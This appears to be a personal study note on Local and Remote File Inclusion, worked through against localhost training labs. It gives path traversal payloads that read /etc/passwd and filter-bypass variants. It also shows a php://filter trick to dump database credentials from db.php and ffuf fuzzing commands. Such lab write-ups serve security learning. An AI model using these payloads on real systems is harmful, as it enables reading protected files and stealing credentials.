
### Local FIle Inclusion(LFI) & Remote File Inclusion(RFI)

LFI : Include files that are already present on the target server

RFI : Allows an attacker to include malicious file from a external remote server, can lead to arbitary code executio 

LFI and RFI happen when an application takes a user input and using that path to a file without properly validating it

example : ?lang=ger
exploit :    ?lang=../../../../../etc/passwd


---

### LFI

Tells us to select recipe
After selecting, the url is

```url
http://localhost/labs/fi0x01.php?filename=chocolate_cake.txt
```

Since its a linux server 
Try 

```url
http://localhost/labs/fi0x01.php?filename=../../../../../../../../etc/passwd
```


![[lfi1.png]]

And we get the /etc/passwd data

We can also use intruder or ffuf with the wordlist
/usr/share/wordlists/wfuzz/Injections/Traversal.txt

```sh
fuf -r -c -w /usr/share/wordlists/wfuzz/Injections/Traversal.txt:FUZZ -u "http://localhost/labs/fi0x01.php?filename=FUZZ" 
```


---

### RFI

```url
http://localhost/labs/fi0x02.php?filename=files%2Fchocolate_cake.txt
```

%2F = /

Try 

```url
http://localhost/labs/fi0x02.php?filename=files%2F../../../../../../etc/passwd
```

Error message : **Warning**: file_get_contents(files/etc/passwd): failed to open stream: No such file or directory in **/var/www/html/labs/fi0x02.php** on line **12**

Since most of our path missing in error message, we can assume that '../'  is being filtered

Try

```url
http://localhost/labs/fi0x02.php?filename=files%2F..././..././..././..././..././etc/passwd
```

This works is server is filtering ou '../' so what happens is that it filters out which was an extra we used to trick it and what remains after filtering out is ../../../


![[lfi2.png]]


We can an LFI here

Now check for RFI 

```url
http://localhost/labs/fi0x02.php?filename=https://google.com
```

![[rfi.png]]


We also have an RFI

If https being filtered try : hthttpstps : splitting it up we get ht https tps , if there is no recursive filtering, we will get file inclusion

If there is recursive file inclusion try

htTps instead of https : do this if https being filtered out




From payloadsallthethings, we can also try wrapper 

```url
http://localhost/labs/fi0x02.php?filename=php://filter/convert.base64-encode/resource=..././db.php
```

Gives us base64 encoded output

Decoding it gives

![[lif3.png]]

So we can steal database credentials as well


---

### File Inclusion Challenge

Page content changes but no request in network tab nor does the page refresh, so maybe using an API.

```http
GET /labs/api/fetchRecipe.php?filename=chocolate_cake.txt
```

It is a REST api request

Try 

```http
GET /labs/api/fetchRecipe.php?filename=....//....//....//....//....//....//etc/passwd
```

![[lfichallenge.png]]

And we have LFI

```sh
ffuf -r -c -request api-req.txt -request-proto http -w /usr/share/wordlists/seclists/SecLists-master/Fuzzing/LFI/LFI-Jhaddix.txt -fw 19,20
```

-fw : filter by number of words


---

